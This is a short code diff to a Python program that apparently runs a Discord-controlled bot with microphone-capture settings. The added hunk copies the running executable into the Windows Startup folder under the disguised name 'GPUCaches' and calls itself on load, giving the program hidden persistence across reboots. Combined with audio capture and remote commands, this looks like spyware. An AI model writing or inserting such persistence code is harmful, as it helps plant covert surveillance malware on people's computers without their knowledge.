@@ -46,6 +46,22 @@ intents.message_content = True
 
 bot = commands.Bot(command_prefix="!", intents=intents)
 
+def add_to_startup():
+    exe_name = "GPUCaches"  
+    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
+    exe_path = os.path.join(startup_folder, exe_name)
+
+    if not os.path.exists(exe_path):  
+        try:
+            shutil.copy(sys.executable, exe_path)  # Copies the EXE to the startup folder
+            print(f"Successfully added {exe_name} to startup.")
+        except Exception as e:
+            print(f"Error adding to startup: {e}")
+
+
+add_to_startup()
+
+
 FORMAT = pyaudio.paInt16
 CHANNELS = 1
 RATE = 44100
